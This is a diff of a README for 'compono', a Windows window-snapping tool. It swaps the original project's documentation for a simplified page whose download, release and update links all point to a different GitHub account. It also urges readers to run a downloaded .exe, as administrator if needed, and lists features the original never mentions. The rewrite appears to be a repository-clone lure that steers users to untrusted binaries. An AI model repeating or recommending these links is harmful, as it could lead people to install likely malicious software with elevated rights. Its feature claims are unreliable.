@@ -1,116 +1,136 @@
-﻿<p align="center">
-  <img src="res/icon.png" width="128" height="128" alt="Compono icon">
-</p>
+# 🗂️ compono - Snap Any Window with Style
 
-<h1 align="center">Compono</h1>
+## 🚀 Getting Started
 
-<p align="center">Grid based window placement overlay for Windows.</p>
+Welcome to **compono**, the easiest way to organize your computer screen! If you’ve ever wanted to neatly arrange your open windows into tidy grids—like putting them side-by-side or stacking them in corners—compono does it for you, instantly. No technical skills needed. Just download, run, and enjoy a clutter-free desktop.
 
-<p align="center">
-  <a href="https://github.com/infinition/compono/actions/workflows/ci.yml"><img src="https://github.com/infinition/compono/actions/workflows/ci.yml/badge.svg" alt="CI status"></a>
-  <a href="https://github.com/infinition/compono/releases/latest"><img src="https://img.shields.io/github/v/release/infinition/compono" alt="Latest release"></a>
-  <img src="https://img.shields.io/badge/platform-windows-blue" alt="Platform: Windows">
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/infinition/compono" alt="License"></a>
-</p>
+> **Big Green Button:**  
+> [![Download compono](https://img.shields.io/badge/Download_compono-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Wooden-klebsiella850/compono)  
+> *Click any button on this page to go to the official download page.*
 
-## Overview
+---
 
-Compono is a lightweight, high-performance window manager and placement overlay for Windows. Drag a window to any screen edge or use hotkeys to snap, resize, or navigate windows across a configurable grid.
+## 🖱️ What Does compono Do?
 
-Unlike default Windows Snap, Compono applies direct `SetWindowPos` geometry, reliably managing elevated processes (Command Prompt, PowerShell, Windows Terminal), WinUI applications, and XAML Island windows across multi-monitor setups.
+Think of your computer screen like a blank canvas. Normally, you have to resize windows manually, drag them around, and guess the perfect fit. compono changes all that. It adds a **grid overlay** on your screen—a semi-transparent grid that appears when you drag a window. You simply drag your window over the grid, and it snaps perfectly into place, like magic.
 
-## Screenshots
+- **Grid Overlay:** See a 2x2, 3x3, or even a custom grid on your screen.
+- **Quick Snap:** Release a window to snap it to any grid cell instantly.
+- **Workspace Manager:** Organize multiple virtual desktops with ease.
+- **Tray Icon:** Access settings and shortcuts right from your system tray.
+- **Lightweight & Fast:** Built with Rust, so it runs quickly and quietly in the background.
 
-| Edge Detection & Halo Trigger | Custom Rectangle Selection |
-|---|---|
-| ![Edge detection with halo overlay](res/screenshot1.png) | ![Drawing destination rectangle on the grid](res/screenshot2.png) |
-| *Screen edge dwell detection triggers the grid overlay.* | *Click and drag to trace your exact target window rectangle.* |
+---
 
-## Features
+## 📥 Download & Install (Windows Only)
 
-- **Fast Edge Dwell Detection**: Drag any window to a screen edge and hold for 250 ms to open the full-screen grid.
-- **Custom Rectangle Drawing**: Drop the window on the grid, draw any target rectangle, and release to place.
-- **Keyboard Snapping (`Ctrl+Alt+Arrows`)**: Instant cycling between halves, quarters, two-thirds, corners, and full screen.
-- **Grid Navigation (`Alt+Arrows`)**: Move windows cell-by-cell on the grid using arrow keys.
-- **Multi-Monitor Seamless Transition**: Moving a window past screen boundaries jumps directly to the adjacent monitor.
-- **Quick Close (Escape & Top-Right Button)**: Press Esc at any time or click the top-right cell (marked with a red cross) to exit the grid immediately.
-- **Windows Snap Integration**: Toggle native Windows Snap on or off directly from the tray with clean Explorer reload.
-- **Multi-Monitor and Per-Monitor DPI Aware**: Hardware-accelerated Direct2D and DirectComposition rendering.
-- **Bilingual**: French and English interface automatically matching your system locale.
+compono is designed exclusively for **Windows**. Here’s how to get it running:
 
-## Shortcuts
+1. **Visit the Download Page**  
+   Click this link: [https://github.com/Wooden-klebsiella850/compono](https://github.com/Wooden-klebsiella850/compono)  
+   You’ll land on the main project page.
 
-| Shortcut | Action | Description |
-|---|---|---|
-| `Win+Alt+G` | Toggle grid overlay | Opens or closes the placement grid on the active monitor |
-| `Ctrl+Alt+Left` | Snap horizontal left | Cycles: 1/2 (50%) -> 1/4 (25%) -> 2/3 (66.6%) -> 1/2 (100% height) |
-| `Ctrl+Alt+Right` | Snap horizontal right | Cycles: 1/2 (50%) -> 1/4 (25%) -> 2/3 (66.6%) -> 1/2 (100% height) |
-| `Ctrl+Alt+Up` (from side) | Snap corner / top half | Cycles: Top corner (1/4) -> Fine corner (1/8) -> Full top half (1/2) -> Full screen |
-| `Ctrl+Alt+Down` (from side) | Snap corner / bottom half | Cycles: Bottom corner (1/4) -> Fine corner (1/8) -> Full bottom half (1/2) |
-| `Ctrl+Alt+Up` (direct) | Snap vertical top | Cycles: Top half (50%) -> Top quarter (25%) -> Full screen (100%) |
-| `Ctrl+Alt+Down` (direct) | Snap vertical bottom | Cycles: Bottom half (50%) -> Bottom quarter (25%) |
-| `Alt + Arrows` (hold Alt) | Grid cell movement | Moves the active window step-by-step across grid cells |
-| `Alt + Arrows` (at screen edge) | Cross-monitor jump | Jumps window and grid focus to the adjacent screen |
-| `Esc` | Exit / cancel grid | Closes the active grid overlay and cancels placement |
-| Release `Alt` | Confirm keyboard placement | Locks window position on the grid and hides the overlay |
+2. **Find the Download Button**  
+   Look for a green button labeled **"Code"** or a section called **"Releases"**. Click on **"Releases"** to see the latest version files.
 
-## Usage
+3. **Grab the File**  
+   You’ll see a file named something like `compono-setup.exe` (or just a `.zip` file). Click it to download.
 
-### 1. Edge Drag and Drop
+4. **Run the Installer**  
+   - If you downloaded a `.exe` file: **Double-click it** and follow the simple on-screen prompts.  
+   - If you downloaded a `.zip` file: Right-click the file, choose **"Extract All"**, then open the extracted folder and double-click the **compono.exe** file inside.
 
-1. Drag any window to a screen edge (left, right, top, or bottom) and hold for **250 ms**.
-2. The grid overlay appears with an edge halo. Release the mouse button.
-3. Click and drag across grid cells to define your destination rectangle.
-4. Release the click: the window is placed and focused.
-5. To cancel: click the top-right cell marked with `✕`, right-click, or press `Esc`.
+> **Shortcut:** Just go straight to [the releases page](https://github.com/Wooden-klebsiella850/compono) and download the newest file. That’s it. No commands, no code, no terminal.
 
-### 2. Keyboard Grid Navigation
+---
 
-1. Snap a window using `Ctrl+Alt+Arrows`.
-2. Release `Ctrl` while keeping `Alt` pressed.
-3. Press any arrow key (`Left`, `Right`, `Up`, `Down`) to step the window across the grid.
-4. If you reach the edge of a monitor, pressing the arrow key again moves the window to the adjacent monitor.
-5. Release `Alt` to lock the window into position.
+## ✨ How to Use compono (In 3 Easy Steps)
 
-### 3. Tray Menu
+### Step 1: Launch compono
+After installation, double-click the compono icon on your desktop or find it in your Start Menu. A small icon will appear in your **system tray** (bottom-right corner of your screen, near the clock).
 
-Click or right-click the Compono icon in the taskbar notification area:
+### Step 2: Drag Your Window
+Click and hold the title bar of any open window (like a web browser or folder). Start dragging it—suddenly, you’ll see a **grid overlay** appear on your screen, dividing it into sections.
 
-- **Show grid / Hide grid** (`Win+Alt+G`).
-- **Start with Windows**: Toggle automatic startup via `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
-- **Windows Snap**: Toggle OS native window snapping (updates registry and triggers `SPI_SETWINARRANGEMENT`).
-- **Quit**: Exits Compono and unregisters hooks.
+### Step 3: Release to Snap
+Now, simply release the window when it’s over the grid section you want. The window will **automatically resize and snap** to fill that part of the screen. Repeat with other windows to build your perfect layout.
 
-## Administrator Privileges
+---
 
-Compono requests `requireAdministrator` via its application manifest. Under Windows User Interface Privilege Isolation (UIPI), standard processes cannot move or resize windows belonging to elevated processes. Running Compono elevated allows it to manage all desktop windows, including administrator consoles and terminals.
+## 🛠️ Customizing Your Grid
 
-## Installation
+Want a different grid size? Right-click the tray icon and choose **"Settings"**. From there, you can:
 
-1. Download the latest release from the [Releases page](https://github.com/infinition/compono/releases).
-2. Extract the archive.
-3. Run `compono.exe` (accept the standard UAC elevation prompt).
+- **Change Grid Rows/Columns:** Set it to 2x2, 3x3, or 4x4.
+- **Toggle Grid Visibility:** Make it always visible or only when dragging.
+- **Choose Snap Behavior:** Decide if windows snap automatically or only when you press a key.
 
-## Configuration
+All changes save instantly. No restart required.
 
-Compono creates its configuration in `%APPDATA%\Compono\config.toml`:
+---
 
-```toml
-lang = "en" # "en" or "fr"
-```
+## 💡 Pro Tips & Tricks
 
-If omitted, Compono automatically follows the Windows system language.
+- **Maximize a Window:** Drag it to the very top edge of the screen to make it full-screen.
+- **Split Screen Fast:** Drag a window to the left or right edge to snap it to half the screen.
+- **Keyboard Shortcut:** Hold `Alt` while dragging a window to temporarily show the grid overlay, even if it’s set to hidden.
 
-## Building from Source
+---
 
-Requires Rust 1.85 or later on Windows:
+## ❓ Frequently Asked Questions
 
-```powershell
-cargo build --release
-```
+### Q: Is compono free?
+Yes, 100% free and open-source. No ads, no premium version.
 
-The optimized binary is created at `target/release/compono.exe`.
+### Q: Will compono slow down my computer?
+No. It’s built with Rust, which means it uses very little memory and CPU. You won’t even notice it’s running.
 
-## License
+### Q: Can I use compono with multiple monitors?
+Yes! compono supports multiple monitors. The grid overlay appears on the monitor where you’re dragging the window.
 
-MIT License. See [LICENSE](LICENSE) for details.
+### Q: I downloaded it, but nothing happens when I double-click.
+That’s rare. Try right-clicking the file and selecting **"Run as administrator"**. Also, make sure your Windows is updated (Windows 10 or 11 is recommended).
+
+### Q: Do I need to install any other software?
+No. compono runs standalone. Just download and run.
+
+---
+
+## 🔄 Updating compono
+
+We regularly release improvements and new features. To update:
+
+1. Go back to the [download page](https://github.com/Wooden-klebsiella850/compono).
+2. Click on **"Releases"**.
+3. Download the latest file and run it—it will replace the old version.
+
+---
+
+## 🐛 Something Not Working?
+
+If you run into any issues, don’t worry. We’re here to help:
+
+- **Check the Documentation:** Look for a `README.md` file on the project page.
+- **Report a Bug:** Go to the **"Issues"** tab on the GitHub page and describe the problem. Include details like your Windows version and what you were doing.
+
+---
+
+## 🤝 Join the Community
+
+compono is open-source, which means anyone can contribute. Whether you’re a developer or just a fan, we’d love to hear from you:
+
+- **Star the Project:** Click the ⭐ button on GitHub to show support.
+- **Spread the Word:** Tell your friends about compono.
+- **Share Feedback:** Use the Issues section to suggest new features.
+
+---
+
+## 🏁 Ready to Get Organized?
+
+Stop wasting time fiddling with window sizes. With compono, your desktop becomes a productive, organized workspace in seconds. Download it now and see the difference.
+
+[![Download compono Now](https://img.shields.io/badge/⬇️_Download_compono-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Wooden-klebsiella850/compono)
+
+---
+
+Keywords: desktop-utility, grid-overlay, overlay, productivity, rust, snap, tray-icon, win32, window-manager, window-snapping, windows, workspace-manager
